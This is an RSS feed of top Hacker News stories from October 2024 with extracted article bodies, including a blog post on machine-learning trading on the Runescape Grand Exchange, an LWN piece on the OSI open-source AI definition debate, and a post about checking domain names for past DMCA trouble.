<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sat, 26 Oct 2024 14:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Bluesky Is Not Decentralized (185 pts)]]></title>
            <link>https://beige.party/@possibledog/113367977656537478</link>
            <guid>41952994</guid>
            <pubDate>Sat, 26 Oct 2024 06:36:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://beige.party/@possibledog/113367977656537478">https://beige.party/@possibledog/113367977656537478</a>, See on <a href="https://news.ycombinator.com/item?id=41952994">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Adventures in algorithmic trading on the Runescape Grand Exchange (117 pts)]]></title>
            <link>https://tristanrhodes.com/blog/Adventures-in-Algorithmic-Trading-on-the-Runescape-Grand-Exchange</link>
            <guid>41952006</guid>
            <pubDate>Sat, 26 Oct 2024 02:23:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tristanrhodes.com/blog/Adventures-in-Algorithmic-Trading-on-the-Runescape-Grand-Exchange">https://tristanrhodes.com/blog/Adventures-in-Algorithmic-Trading-on-the-Runescape-Grand-Exchange</a>, See on <a href="https://news.ycombinator.com/item?id=41952006">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
    <h2>Adventures in Algorithmic Trading on the Runescape Grand Exchange</h2>
    <h3>Overview</h3>
    <p>
      Runescape has been a game near and dear to my heart since I was a child. Though I do not actively 
      play anymore, it still functions as an interesting programming project substrate. 
      Most recently, I created a bot that automatically executes trades on the Grand Exchange in order to 
      conduct market making via common machine learning techniques. This blog post will explain the individual 
      components of the bot, the various trading algorithms used, and the results of an experiment comparing 
      the various trading algorithms' performance.
    </p>
    <p>
      The Old School Runescape Grand Exchange is a market where all players can place buy or sell offers 
      for almost any item in the game. It is a chaotic system like most markets, but it is also modelable 
      on small enough time scales or microstructures. The only constraint placed on offers is a four hour 
      buy limit that is different for each item. For example, coal ore has a buy limit of 13,000. This means that a player 
      can only buy up to 13,000 coal every four hours. Another interesting feature of the Grand Exchange is 
      the 1% tax applied to all executed sell offers. This tax is applied to all items with an individual 
      trading price greater than 100 gold. It is capped at 5 million gold per offer and is applied on a 
      per-item basis rounded down to the nearest integer. The proceeds of the tax are used by the game 
      developer to control inflation.  As an example, if I were to sell 10,000 coal ore at today's price 
      of 142 gold per item, then my executed trade would be subject to a tax of: <code>math.floor(0.01 * 142) * 10000 = 10,000 gold</code>
    </p>
    <h3>Components</h3>
    <p>
      The bot is composed of three separate applications: a JavaScript API to interact with the OSRS Wiki's 
      real-time item price stream, a Java client to control character actions, and a Python API to return the 
      ranking of a set of possible offers in terms of their forecasted profitability. The OSRS Wiki project 
      maintains <a target="_blank" href="https://oldschool.runescape.wiki/w/RuneScape:Real-time_Prices">a useful API</a> that, 
      every 5 minutes, writes data about every single item trading on the Grand Exchange. It records fields such 
      as the average item price spread over a configurable past period, the volume traded over a configurable past 
      period, and the buy limit of each item.
    </p>
    <p>
      The data pipeline I use to train the ML models is composed of two cronjobs that interact with the 
      OSRS Wiki API: one that polls it every 5 minutes, and another that polls it every hour. Each of them record 
      the price spreads and volumes of every item traded on the Grand Exchange over that time period and write the 
      resulting data to a database. Furthermore, the bot records data about each offer that it successfully executes. 
      The fields it records are: gold/second generated, absolute profit generated, timestamp of the buy offer 
      initialization, and the ID of the item traded. These two tables are joined on timestamp such that each row 
      contains aggregate trade data of the item across the entire Grand Exchange for the period leading up to 
      a successful trade as well as the profitability of the individual executed trade. The target of the model's 
      loss function is gold/second generated. Lastly, to prevent temporal leakage, the training set consists of 
      labeled trades from 63 days prior to 14 days prior, while the validation set includes the most recent 14 days.
    </p>
    <h3>Baseline Method</h3>
    <p>
      In any modeling scenario, it is always good practice to establish a naive baseline method that can be 
      used to determine if non-trivial methods are actually improving performance. The baseline method I came 
      up with is as follows:
    </p>
    <p>
      Given an item, its price spread over the last 5 mins, and its trade volume over the last hour, compute 
      the following variables:
    </p>
    <p>
      <b>ROI:</b>
      <code>(sell_total - {1% tax} - buy_total) / buy_total</code>
    </p>
    <p>
      <b>Volume ratio:</b>
      <code>(1h_volume_traded_high_price / 1h_volume_traded_low_price)</code>
    </p>
    <p>
      <b>Average gold/second of item trades over last two weeks</b>
    </p>
    <p>
      Then do the following:
      </p><ol>
        <li>Compute ROI Z score for each item.</li>
        <li>Compute volume ratio Z score for each item.</li>
        <li>Filter out any items with a historically negative average gold/second metric.</li>
        <li>Sort each item by <code>(roi_zscore + volume_ratio_zscore)</code> descending.</li>
      </ol>
    
    <h3>Machine Learning Methods</h3>
    <p>
      After generating results for the baseline method, I ran a one-week experiment comparing the baseline 
      to <a target="_blank" href="https://github.com/rhodesrt/ML_exercises/blob/main/random_forest/random_forest.ipynb">random forest</a> 
      and <a target="_blank" href="https://github.com/rhodesrt/ML_exercises/blob/main/random_forest/neural_net.ipynb">neural network</a> 
      regression models. In order to avoid a sample ratio mismatch, I 
      programmed the game client to choose randomly between each model type's output when ranking potential offers. 
      The results are displayed in the following table sorted by mean profit/hour in 
      descending order:
    </p>
    <table>
      <thead>
          <tr>
              <th>Model Type</th>
              <th>n</th>
              <th>L2 loss</th>
              <th>Mean profit/hr</th>
              <th>95% CI profit/hr</th>
          </tr>
      </thead>
      <tbody>
          <tr>
              <td>random forest</td>
              <td>257</td>
              <td>53</td>
              <td>150,892</td>
              <td>129,140 - 172,643</td>
          </tr>
          <tr>
              <td>neural network</td>
              <td>191</td>
              <td>57</td>
              <td>123,923</td>
              <td>103,279 - 144,566</td>
          </tr>
          <tr>
              <td>baseline</td>
              <td>216</td>
              <td>N/A</td>
              <td>87,353</td>
              <td>79,493 - 95,212</td>
          </tr>
      </tbody>
  </table>
  <h3>Conclusion</h3>
  <p>
    Machine learning methods outperformed baseline by a significant amount. Among ML model architectures, random 
    forest performed the best, edging out the neural network slightly. This aligns with the validation loss of each 
    model during training. I am somewhat surprised that the random forest generated the highest profit/hour, as 
    random forest predictions are typically constrained to the range of target values in the training data. With 
    that said, the training data does have relatively low variance as the market making trades these models are 
    predicting tend to be high frequency and low ROI.
  </p>
  <p>
    Please reach out to me if you are interested in obtaining the training data used for this project. 
    The code used to train the models can be found linked above as well as on my 
    <a target="_blank" href="https://github.com/rhodesrt/ML_exercises/tree/main/random_forest">Github</a>.
  </p>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OSI readies controversial open-source AI definition (103 pts)]]></title>
            <link>https://lwn.net/SubscriberLink/995159/a37fb9817a00ebcb/</link>
            <guid>41951421</guid>
            <pubDate>Sat, 26 Oct 2024 00:23:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lwn.net/SubscriberLink/995159/a37fb9817a00ebcb/">https://lwn.net/SubscriberLink/995159/a37fb9817a00ebcb/</a>, See on <a href="https://news.ycombinator.com/item?id=41951421">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<blockquote>
<div>
<h3>Welcome to LWN.net</h3>
<p>
The following subscription-only content has been made available to you 
by an LWN subscriber.  Thousands of subscribers depend on LWN for the 
best news from the Linux and free software communities.  If you enjoy this 
article, please consider <a href="https://lwn.net/subscribe/">subscribing to LWN</a>.  Thank you
for visiting LWN.net!
</p></div>
</blockquote>

<p>The <a href="https://opensource.org/">Open Source Initiative</a>
(OSI) has been working on defining <a href="https://opensource.org/ai">Open Source AI</a>—that is what
constitutes an AI system that can be used, studied, modified, and
shared for any purpose—for almost two
years. Its <a href="https://opensource.org/about/board-of-directors">board</a> will
be voting on the <a href="https://opensource.org/ai/drafts/the-open-source-ai-definition-1-0-rc2">Open Source AI Definition</a> (OSAID) on Sunday,
October&nbsp;27, with the 1.0 version slated to be published on
October&nbsp;28. It is never possible to please <em>everyone</em> in
such an endeavor, and it would be folly to make that a goal. However,
a number of prominent figures in the open-source community have voiced
concerns that OSI is setting the bar too low with the OSAID—which
will undo decades of community work to cajole vendors into adhering to
or respecting the original <a href="https://opensource.org/osd">Open Source
Definition</a> (OSD).</p>

<h4>Defining Open&nbsp;Source&nbsp;AI</h4>

<p>OSI executive director Stefano Maffulli <a href="https://opensource.org/blog/now-is-the-time-to-define-open-source-ai">announced</a>
the organization's intent to provide a definition for open-source AI
in June&nbsp;2023. He took exception to announcements of 
"<q>large language models, foundational models, tooling, services all
claiming to be 'open' or 'Open Source'</q>", while adding restrictions
which run afoul of the OSD. A <a href="https://spectrum.ieee.org/open-source-llm-not-open">survey</a>
of large-language model (LLM) systems in 2023 found that ostensibly
open-source LLMs did not live up to the name.</p>

<p>The problem is not quite as simple as saying "use an OSD-compliant
license" for LLMs, because there are many more components to
consider. The original OSD is understood to apply to the
source code of a program in "<q>the preferred form in which a
programmer would modify the program</q>". A program is not considered
open source if a developer cannot study, use, modify, and share a
program, and a license is not OSD‑compliant if it does not
preserve those freedoms. A program can include non-free data and still
be open source. For example, the game <a href="https://github.com/id-Software/Quake-III-Arena">Quake&nbsp;III&nbsp;Arena</a>
(Q3A) is available under the GPLv2. That distribution, however, does
not include the <a href="https://quakewiki.org/wiki/.pak">pak</a>
files that contain the maps, textures, and other content required to
actually play the commercial game. Despite that, others can still use
the Q3A code to create their own games, such as <a href="https://tremulous.net/">Tremulous</a>.</p>

<!-- middle-ad -->

<p>When discussing an "AI system", however, things are much more
complicated. There is more than just the code that is used to run the
models to do work of some kind, and the data is not something that
can be wholly separate from the system in the way that it can be with a
game. When looking at, say, LLMs, there is the model architecture, the
code used to train models, model parameters, the techniques and methodologies used for
training, the procedures for labeling training data, the supporting
libraries, and (of course) the data used to train the models.</p>

<p>OSI has been working on its definition since last year. It held a kickoff meeting on June&nbsp;21, 2023 at the
Mozilla headquarters in San&nbsp;Francisco. It <a href="https://opensource.org/deepdive/#:~:text=How%20to%20participate">invited
participation</a> afterward via a regular series of in-person
and <a href="https://opensource.org/ai/townhalls">online sessions</a>,
and with a <a href="https://discuss.opensource.org/">forum for online
discussions</a>. LWN <a href="https://lwn.net/Articles/961868/#:~:text=Stefano%20Maffulli,AI%20system">covered</a>
one of the sessions, held at <a href="https://archive.fosdem.org/2024/">FOSDEM 2024</a>, in
February.</p>

<p>The current draft of the OSAID takes its definition of an AI system from the <a href="https://www.oecd.org/">Organisation for Economic Co-operation
and Development</a> (OECD) <a href="https://legalinstruments.oecd.org/en/instruments/OECD-LEGAL-0449">Recommendation
of the Council on Artificial Intelligence</a>:</p>

<blockquote>
A machine-based system that, for explicit or implicit objectives,
infers, from the input it receives, how to generate outputs such as
predictions, content, recommendations, or decisions that can influence
physical or virtual environments.
</blockquote>

<p>This includes source code for training and running the system,
model parameters "<q>such as weights or other configuration
settings</q>", as well as "<q>sufficiently detailed information about
the data used to train the system so that a skilled person can build a
substantially equivalent system</q>".</p>

<h4>Preferred form to make modifications</h4>

<p>Those elements must all be available under OSI-approved licenses,
according to the proposed definition, which seems perfectly in line
with what we've come to expect when something is called "open
source". There is an exception, though, for things like the data
information and model parameters which must be available under
"<q>OSI-approved terms</q>". The definition of OSI-approved terms is
not supplied yet.</p>

<p>There is no requirement to make the <em>training data</em> available. To be
compliant with the current draft of the OSAID, an AI system need only
provide "<q>detailed information</q>" about the data but not the data
itself.</p>

<p>The OSI <a href="https://opensource.org/blog/community-input-drives-the-new-draft-of-the-open-source-ai-definition">published</a>
version 0.0.9 on August 22. It acknowledged then that "<q>training data is
one of the most hotly debated parts of the definition</q>". However,
the OSI was choosing not to require training data:</p>

<blockquote>
<p>After long deliberation and co-design sessions we have concluded
that defining training data as a benefit, not a requirement, is the
best way to go.</p>

<p>Training data is valuable to study AI systems: to understand the
biases that have been learned, which can impact system behavior. But
training data is not part of the preferred form for making
modifications to an existing AI system. The insights and
correlations in that data have already been learned.</p>
</blockquote>

<p>As it stands, some feel that the OSAID falls short of allowing the
four freedoms that it is supposed to ensure. For example, julia
ferraioli <a href="https://www.juliaferraioli.com/blog/2024/on-open-source-ai/">wrote</a>
that without including data, the only things that the OSAID guarantees
are the ability to use and distribute an AI system. "<q>They would be
able to build on top of it, through methods such as transfer learning
and fine-tuning, but that's it.</q>"

</p><p>Tom Callaway has <a href="https://www.linkedin.com/pulse/why-open-data-necessary-source-ai-tom-callaway-stzcc/">written</a>
at length on LinkedIn about why open data should be a requirement. He 
acknowledges that there are good reasons that distributors of an AI
system may not want, or be able, to distribute training data. For
example, the data itself may have a high monetary value on its own,
and a vendor may be unwilling or unable to share it.
Acme Corp might license a data set and
have permission to create an AI system using it, but not the
ability to distribute the data itself. The data might have legal
issues, ranging from confidentiality (e.g., medical data sets) to a
desire to avoid lawsuits from using copyrighted data.</p>

<p>All of those are understandable reasons for not distributing
data with an AI system, he said, but they don't argue for crafting a definition
that allows companies to call their system open:</p>

<blockquote>
<p>If we let the Open Source AI definition contain a loophole that
makes data optional, we devalue the meaning of "open source" in all
other contexts. While there are lots of companies who would like to
see open source mean less, I think it's critical that we not
compromise here, even if it means there are less Open Source AI
systems at first.</p>
</blockquote>

<p>Objections to lack of training data are more than an attachment to
the original meaning of open source. Giacomo Tesio <a href="https://discuss.opensource.org/t/list-of-unaddressed-issues-of-osaid-rc2/650">posted</a>
a list of issues he considered unaddressed in the RC2 version of
the OSAID, including a claim that there is inherent insecurity due to the
ability to <a href="https://arxiv.org/abs/2204.06974">plant
undetectable backdoors</a> in machine-learning models.</p>

<h4>Others weigh in</h4>

<p>The Free Software Foundation (FSF) <a href="https://www.fsf.org/news/fsf-is-working-on-freedom-in-machine-learning-applications">announced</a>
that it was working on "<q>a statement of criteria for free machine
learning applications</q>" to call something a free (or libre)
machine-learning application. The FSF says that it is close to a
definition, and is working on the exact text. However, it adds that
"<q>we believe that we cannot say a ML application 'is free' unless
all its training data and the related scripts for processing it
respect all users, following the four freedoms</q>".</p>

<p>However, the FSF makes a distinction between non-free and
unethical in this case:</p>

<blockquote>
It may be that some nonfree ML have valid moral reasons for not
releasing training data, such as personal medical data. In that case,
we would describe the application as a whole as nonfree. But using it
could be ethically excusable if it helps you do a specialized job that
is vital for society, such as diagnosing disease or injury.
</blockquote>

<p>The <a href="https://sfconservancy.org/">Software&nbsp;Freedom&nbsp;Conservancy</a>
has <a href="https://sfconservancy.org/news/2024/oct/25/aspirational-on-llm-generative-ai-programming/">announced</a>
an "<q>aspirational statement</q>" about LLM-backed generative AI for
programming called "Machine-Learning-Assisted Programming that
Respects User Freedom". Unlike the OSAID, this target focuses solely
on computer-assisted programming, and was developed <a href="https://sfconservancy.org/blog/2022/feb/03/github-copilot-copyleft-gpl/">in
response</a> to <a href="https://en.wikipedia.org/wiki/GitHub_Copilot">GitHub
Copilot</a>. The announcement did not directly name the OSI or the OSAID effort, but
said "<q>we have avoided any process that effectively auto-endorses
the problematic practices of companies whose proprietary products are
already widely deployed</q>". It describes an ideal LLM system built
only with FOSS, with all components available, and only for the creation of FOSS.</p>

<h4>Response to criticisms</h4>

<p>I emailed Maffulli about some of the criticisms of the current
OSAID draft, and asked why OSI appears to be "lowering the bar" when
the OSI has never budged on source availability and use
restrictions. He replied:</p>

<blockquote>
<p>I'll be blunt: you mention "source redistribution" in your question
and that's what leads people like [Callaway] into a mental trap
[...]</p>

<p>There are some groups believing that more components are required to
guarantee more transparency. Other groups instead believe that model
parameters and architecture are enough to modify AI. The Open Source
AI Definition, developed publicly with a wide variety of stakeholders
worldwide, with deep expertise on building AI (see the <a href="https://opensource.org/ai/endorsements">list of endorsers</a>),
found that while those approaches are legitimate, neither is
optimal. The OSAID grants users the rights (with licenses) and the
tools (with the list of required components) to meaningfully
collaborate and innovate on (and fork, if required) AI systems.  We
have not compromised on our principles: we learned many new things
from actual AI experts along the way.</p>
</blockquote>

<p>Maffulli objected to the idea that the OSAID was weaker or making
concessions, and said that the preferred form for modifying ML systems
was what is in the OSAID: "<q>it's not me nor OSI board saying that,
it's in the list of endorsers and in [Carnegie Mellon University's] <a href="https://www.cmu.edu/engin/programs/about-ofai/cmu-osaid-statement.html">comment</a></q>". He
added that OSI had synthesized input from "<q>AI builders, users, and
deployers, content creators, unions, ethicists, lawyers, software
developers from all over the world</q>" to arrive at the definition. A
"<q>simple translation</q>" of the OSD, he said, would not work.</p>

<p>Stephen O'Grady, founder of the RedMonk analyst firm, also makes
the case that the OSD does not easily translate to AI projects. But he
does not believe that the term open source "<q>can or should be
extended into the AI world</q>" as he <a href="https://redmonk.com/sogrady/2024/10/22/from-open-source-to-ai/">wrote</a>
in a blog post on October&nbsp;22:</p>

<blockquote>
<p>At its heart, the current deliberation around an open source
definition for AI is an attempt to drag a term defined over two
decades ago to describe a narrowly defined asset into the present to
instead cover a brand new, far more complicated future set of
artifacts.</p>
</blockquote>

<p>O'Grady makes the case that the OSI has set out on a pragmatic path
to define open-source AI, which requires nuance. Open source has
succeeded, in part, because the OSD removes nuance. Does a license
comply with the OSD or doesn't it? It's pretty easy to determine. Less
so with the OSAID. The pragmatic path, he said:

</p><blockquote>
Involves substantial compromise and, more problematically,
requires explanation to be understood. And as the old political adage
advises: "If you're explaining, you're losing."
</blockquote>

<p>It would have been better, he said, if the OSI had not tried to
"<q>bend and reshape a decades old definition</q>" and instead had
tried to craft something from a clean slate. That seems unlikely now,
he said, after two years of trying to "<q>thread the needle between
idealism and capitalism to arrive at an ideologically sound and yet
commercially acceptable</q>" definition.</p>

<p>Indeed, it seems likely that the OSI board will move forward with
the current draft of the OSAID or something close to it. The
impact that will have is much less certain.</p>

<br clear="all">
               <br clear="all">
               <hr>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How can this 6 axis robot have a static accuracy of 0.05 mm? (2021) [video] (183 pts)]]></title>
            <link>https://www.youtube.com/watch?v=SioCwvR_PYY</link>
            <guid>41951408</guid>
            <pubDate>Sat, 26 Oct 2024 00:20:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=SioCwvR_PYY">https://www.youtube.com/watch?v=SioCwvR_PYY</a>, See on <a href="https://news.ycombinator.com/item?id=41951408">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Before you buy a domain name, first check to see if it's haunted (526 pts)]]></title>
            <link>https://www.bryanbraun.com/2024/10/25/before-you-buy-a-domain-name-first-check-to-see-if-its-haunted/</link>
            <guid>41951131</guid>
            <pubDate>Fri, 25 Oct 2024 23:43:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bryanbraun.com/2024/10/25/before-you-buy-a-domain-name-first-check-to-see-if-its-haunted/">https://www.bryanbraun.com/2024/10/25/before-you-buy-a-domain-name-first-check-to-see-if-its-haunted/</a>, See on <a href="https://news.ycombinator.com/item?id=41951131">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
    <p>In mid-2022 I bought a new domain name.</p>

<p>The name was <code>musicbox.fun</code>. I got it for a side-project, an <a href="https://musicbox.fun/">interactive online music box</a> that I had built and hosted at <code>musicboxfun.com</code>. The new name was shorter and more quirky. I felt lucky to have grabbed it.</p>

<p>Unfortunately, <code>musicbox.fun</code> had a history. Before I bought it, the domain was used to host pirated music.</p>

<figure>
  <img src="https://www.bryanbraun.com/assets/images/old-music-box-fun.png" alt="A screenshot of musicbox.fun as it existed in 2018, before I owned it">
  <figcaption><code>musicbox.fun</code>, as it existed in 2018 (before I owned it)</figcaption>
</figure>

<p>From June 2018 to February 2021, the site racked up thousands of copyright violation complaints. Over 20,000 of its urls were delisted by Google (and other search engines) before the site went offline in 2022.</p>

<p>I had no idea, of course. It wasn’t until I had redirected all of my <code>musicboxfun.com</code> traffic to <code>musicbox.fun</code> that I noticed that something wasn’t right: my web traffic from organic search dropped to zero.</p>

<p>I assumed it was temporary so I double-checked my process and waited for awhile, but it never really recovered. It wasn’t until a year later that I discovered the copyright violations and learned that the domain name was compromised.</p>

<p>Apparently, this is a thing that happens to domain names, but as far as I know, there’s not really a name for it. When I described it to my wife, she said <em>“Oh, so it’s haunted.”</em></p>

<p>“Haunted” is the perfect word for this:</p>
<ul>
  <li>Something terrible happened at the domain name in the past.</li>
  <li>On the surface, nothing seems wrong with the domain name.</li>
  <li>Then there are signs that something isn’t right.</li>
  <li>Obligatory jump-scare when you discover what happened.</li>
  <li>Internal debate: do you abandon it or try to fix it?</li>
  <li>There’s a ton of superstition around how to fix it.</li>
  <li>Superficial fixes don’t seem to work.</li>
</ul>

<figure>
  <img src="https://www.bryanbraun.com/assets/images/ghostbusters.jpg" alt="A scene from the movie Ghostbusters.">
  <figcaption>When there's something strange with your domain name, who you gonna call?</figcaption>
</figure>

<p>So to summarize, I’m saying a domain name is “haunted” when something in its past gives it a poor reputation among search engines, affecting its ability to rank in search results, even after it changes ownership.</p>

<p>The inner-workings of search engines are notoriously opaque*, making it difficult to 1) know if you’re being affected and 2) know how to fix it. The following are my suggestions, based on my experience with <code>musicbox.fun</code>.</p>

<h2 id="how-to-check-if-a-domain-name-is-haunted">How to check if a domain name is haunted</h2>

<p>Before you buy a domain name, there’s a few ways to check if it’s haunted:</p>

<h3 id="1-check-the-wayback-machine-at-archiveorg">1. Check the Wayback Machine at archive.org</h3>

<p>If you go to <a href="https://web.archive.org/">web.archive.org</a> and put in your domain name, it will pull up archived web pages of whatever lived at the domain in the past. Here’s a couple things to look out for:</p>

<ol>
  <li>Does anything in the past look illegal or sketchy (piracy, gambling, porn, etc)?</li>
  <li>Is the history suspiciously empty?
    <ul>
      <li>If so, then possibly the past content was <a href="https://help.archive.org/help/how-do-i-request-to-remove-something-from-archive-org-2/">removed by request</a> (I suspect this was the case for <code>musicbox.fun</code>)</li>
    </ul>
  </li>
</ol>

<h3 id="2-search-dmca-complaints">2. Search DMCA complaints</h3>

<p>DMCA stands for “Digital Millenium Copyright Act,” which is a US law that enables people to report copyright infractions to search engine companies (among other things). These reports are public, and you can look them up in a few ways:</p>

<ol>
  <li>Search <a href="https://transparencyreport.google.com/">Google Transparency Report</a> for your domain, to find delist requests (you can <a href="https://transparencyreport.google.com/copyright/domains/musicbox.fun">see the report for musicbox.fun here</a>).</li>
  <li>Search <a href="https://lumendatabase.org/">lumendatabase.org</a> for your domain, to find copyright complaints (for an example, see <a href="https://lumendatabase.org/notices/search?term=%22https%3A%2F%2Fmusicbox.fun%22&amp;term-exact-search=true&amp;sort_by=">these results for musicbox.fun</a>).</li>
</ol>

<p>Finding ANY copyright complaints for your domain is cause for concern, especially if there are a lot of them and they were filed recently.</p>

<h3 id="3-search-historical-seo-data">3. Search historical SEO data</h3>

<p>If you’re considering buying an important domain name, you may also want to search historical SEO data. Advanced SEO tools like <a href="https://ahrefs.com/">ahrefs.com</a> can give you detailed information about backlinks, ranking history, and estimates for traffic and domain authority. Often, you’ll need to pay to get full access to this kind of data.</p>

<p>Interpreting this data is beyond the scope of this post, but a bit of research can help uncover problems here.</p>

<h2 id="ok-its-haunted-now-what-do-i-do">Ok, it’s haunted. Now what do I do?</h2>

<h3 id="1-talk-to-the-search-engines">1. Talk to the search engines</h3>

<p>Many search engines have tools for domain owners, like <a href="https://search.google.com/search-console">Google Search Console</a> and <a href="https://www.bing.com/webmasters">Bing Webmaster Tools</a>. Definitely set up a profile and get your domain name added. It can help surface past issues and it gives you a way to report when issues have been resolved. For more details about specific actions you can take here, see <a href="https://webmasters.stackexchange.com/a/145283/36576">my stackexchange post</a> on the topic.</p>

<p>If your domain has DMCA complaints, you may be tempted to file a <a href="https://support.google.com/legal/troubleshooter/1114905?rd=2&amp;sjid=13861243148551035047-NC#ts=9814647%2C1115655%2C13630207%2C12999302%2C9814950%2C1115791">DMCA counter-notice</a>. Don’t do it. Counter-notices are for <em>errorneous</em> copyright complaints, not complaints that were once valid but no longer relevant. Per Google’s counter-notice submission form:</p>

<blockquote>
  <p>Please note: If the content on the page was infringing at the time the original removal request arrived, your counter notice is not legally valid. Do not submit a counter notice if there was illegal content, even if it’s now been removed.</p>
</blockquote>

<p>As far as I can tell, there’s not really anything you can do to make past, valid DCMA complaints go away.</p>

<h3 id="2-double-down-on-best-practices">2. Double-down on best practices</h3>

<p>My SEO strategy has always been to do great work and make it easy for Google to see it. It usually works pretty well (at least for my non-haunted domains). For haunted domains, you have a bad reputation to overturn, which seems to require extra vigilence. SEO basics, like high-quality, structured, accessible, content on a fast-loading site, are table stakes.</p>

<p>If you’ve done any SEO work, you know that search engines treat links to your site as a massive signal of relevance and trust. I suspect that fresh incoming links are especially important for overturning a bad reputation, though I haven’t confirmed this personally. If you think <code>musicbox.fun</code> is a useful project and you wield <a href="https://www.bryanbraun.com/2020/10/03/the-power-of-a-link/">the power of a link</a>, consider posting a link to it, and maybe we’ll find out together.</p>

<h3 id="3-wait-for-a-while">3. Wait for a while?</h3>

<p>In my research I found <a href="https://webmasters.stackexchange.com/a/99701/36576">a detailed stackexchange post about trust scores and how they are affected by DMCA complaints</a>. This post suggested that recovery could take some time:</p>

<blockquote>
  <p>It takes years to rebuild trust scores and for some sites, this may never happen.
…the reality is that a domain can ruin its value beyond redemption.</p>
</blockquote>

<p>This post isn’t a primary source, but I also came across an Q&amp;A with a Google Search employee who fielded a similar question about DMCA violations. Their response said something similar, basically, that it can take time for the reputation effects to wear off (I’m struggling to find the video now, but I’ll link it when I do).</p>

<p>All of this is fairly disappointing. In a perfect world, when your legitimately good content isn’t being surfaced by Google, it’s a failure on <strong>their</strong> part, and <strong>their</strong> problem to solve, not yours. In practice, it is <strong>your</strong> problem and you have to do a bunch of work to help them see that their current assessment of your domain name is no longer accurate.</p>

<p><img src="https://www.bryanbraun.com/assets/images/this-house-is-clean.jpg" alt="Image of the medium from the movie 'Poltergeist' saying &quot;this house is clean&quot;"></p>

<hr>

<p>Ideally, search engine algorithms would give new domain owners a fresh start. Yes, it would prevent “haunted domain issues” but it would also reduce <a href="https://macwright.com/2024/10/16/domain-second-thoughts">squatting on trusted domains</a> (another issue I’ve been burned by). Unfortunately, we don’t live in that world*, so we only have a few options:</p>

<ol>
  <li>Avoid buying haunted domain names</li>
  <li>Abandon domain names, once you discover that they are haunted</li>
  <li>Put in a bunch of time and effort to restore a haunted domain name’s low trust score</li>
</ol>

<p>For <code>musicbox.fun</code>, I want to at least <em>try</em> #3. I’ve taken some of the steps above and it feels like I’m starting to see progress. It’s slow, but I’m not in a big hurry to restore traffic. The site is just a hobby and it was always a niche project for a niche audience.</p>

<p>Either way, I hope to post an update in a while to let you know if it improves over time.</p>

<hr>

<p><small>* It’s easy to attribute issues like these to anti-competitive behavior or some other malicious cause, but I don’t blame Google here. If their reputation algorithm was more transparent (or forgiving), it could be more easily exploited by bad actors. Obscurity prevents exploitation but also adds to the mystery and superstition that plagues the SEO industry. It’s tempting to get sucked into the mystery, trying to figure out the algorithm despite its constant changes and intentional obscurity, but that’s not how I want to live my life.</small></p>

  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Wikipedia article blocked worldwide by Delhi high court (551 pts)]]></title>
            <link>https://en.wikipedia.org/wiki/Asian_News_International_vs._Wikimedia_Foundation</link>
            <guid>41950392</guid>
            <pubDate>Fri, 25 Oct 2024 22:17:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://en.wikipedia.org/wiki/Asian_News_International_vs._Wikimedia_Foundation">https://en.wikipedia.org/wiki/Asian_News_International_vs._Wikimedia_Foundation</a>, See on <a href="https://news.ycombinator.com/item?id=41950392">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="presentation"><tbody><tr><td><p><span typeof="mw:File"><span><img alt="" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Wikimedia-logo_black.svg/40px-Wikimedia-logo_black.svg.png" decoding="async" width="40" height="40" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Wikimedia-logo_black.svg/60px-Wikimedia-logo_black.svg.png 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Wikimedia-logo_black.svg/80px-Wikimedia-logo_black.svg.png 2x" data-file-width="512" data-file-height="512"></span></span></p></td><td><div><p><a href="https://wikimediafoundation.org/" title="foundationsite:">The Wikimedia Foundation</a> has suspended access to this page due to <a href="https://foundation.wikimedia.org/wiki/File:October_16_2024_ANI_v_Wikimedia_order.pdf" title="foundation:File:October 16 2024 ANI v Wikimedia order.pdf">an order by the Delhi High Court</a>, without prejudice to the Foundation's rights. We are pursuing all available legal options.  
</p><p>We remain committed to access to knowledge as a human right. We are working to ensure that everyone can access and share free knowledge on Wikipedia.  
</p><p>
This regards active litigation, and this page will be updated when we are able to share more information.</p></div></td></tr></tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Jeff Bezos killed Washington Post endorsement of Kamala Harris (679 pts)]]></title>
            <link>https://www.cnbc.com/2024/10/25/jeff-bezos-killed-washington-post-endorsement-of-kamala-harris-.html</link>
            <guid>41949297</guid>
            <pubDate>Fri, 25 Oct 2024 20:22:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2024/10/25/jeff-bezos-killed-washington-post-endorsement-of-kamala-harris-.html">https://www.cnbc.com/2024/10/25/jeff-bezos-killed-washington-post-endorsement-of-kamala-harris-.html</a>, See on <a href="https://news.ycombinator.com/item?id=41949297">Hacker News</a></p>
